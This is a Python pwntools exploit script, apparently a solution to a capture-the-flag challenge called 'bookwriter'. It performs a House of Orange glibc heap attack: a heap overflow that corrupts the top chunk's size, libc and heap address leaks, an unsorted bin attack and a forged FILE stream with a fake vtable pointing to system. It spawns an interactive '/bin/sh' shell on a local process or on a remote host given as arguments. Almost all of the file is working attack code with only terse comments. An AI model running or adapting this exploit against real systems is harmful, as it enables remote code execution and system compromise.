#/usr/env/bin python
from pwn import *

context.binary = './bookwriter'

def add(Size, Content):
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(Size))
    io.recvuntil('Content :')
    io.send(Content)

def view(Id):
    io.recvuntil('Your choice :')
    io.sendline(str(2))
    io.recvuntil('Index of page :')
    io.sendline(str(Id))

def edit(Id,Content):
    io.recvuntil('Your choice :')
    io.sendline(str(3))
    io.recvuntil('Index of page :')
    io.sendline(str(Id))
    io.recvuntil('Content:')
    io.send(Content)

def information(Author):
    io.recvuntil('Your choice :')
    io.sendline(str(4))
    io.recvuntil('A'*0x40)
    addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x10
    io.recvuntil('(yes:1 / no:0) ')
    io.sendline(str(1))
    io.recvuntil('Author :')
    io.send(Author)
    return addr

def exploit():
    #House-Of-Orange
    #leak heap_base
    io.recvuntil('Author :')
    Author = 'A'*0x40
    io.send(Author)

    # Heap Overflow to Modify TopChunk Size
    add(0x28,'0'*0x28)          #id=0
    edit(0,'1'*0x28)
    edit(0,'\x00'*0x28+p16(0xfd1)+"\x00")

    # Trigger sysmalloc ==> _int_free TopChunk
    add(0x1000,'1'+'\n')        #id=1

    # leak libc_base
    add(0x1,'x')                #id=2
    view(2)
    io.recvuntil('Content :\n')
    libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-(0x3c3b20+1624)
    system_addr = libc_base+libc.symbols['system']
    log.info('system_addr:'+hex(system_addr))
    IO_list_all = libc_base+libc.symbols['_IO_list_all']
    log.info('_IO_list_all:'+hex(IO_list_all))

    #leak heap_base
    heap_base = information('A'*0x40)
    log.info('heap_base:'+hex(heap_base))

    #Index Overflow
    for i in range(0x3,0x9):
        add(0x20,str(i)*0x20)

    #UnsortedBin Attack
    vtable_addr = heap_base+0x248
    payload = 0x2c*p64(0)
    #Fake File_stream in smallbin[4]
    fake_stream = ""
    fake_stream = "/bin/sh\x00"+p64(0x61)
    fake_stream += p64(0)+p64(IO_list_all-0x10)
    fake_stream = fake_stream.ljust(0xa0,'\x00')
    fake_stream += p64(heap_base+0x240)
    fake_stream = fake_stream.ljust(0xc0,'\x00')
    fake_stream += p64(1)+2*p64(0)+p64(vtable_addr)
    payload += fake_stream
    payload += p64(2)
    payload += p64(3)
    payload += p64(system_addr)
    gdb.attach(io)
    edit(0,payload)
    # Trigger UnsortedBin Attack
    # malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(0x10))
    io.interactive()

if __name__ == '__main__':
    log.info('For remote %s HOST POST'% sys.argv[0])
    elf = ELF('./bookwriter')
    if len(sys.argv)>1:
        io = remote(sys.argv[1], int(sys.argv[2]))
        libc = ELF('./libc_64.so.6')
        exploit()
    else:
        io = process('./bookwriter',env={'LD_PRELOAD':'./libc_64.so.6'})
        libc = ELF('./libc_64.so.6')
        exploit()

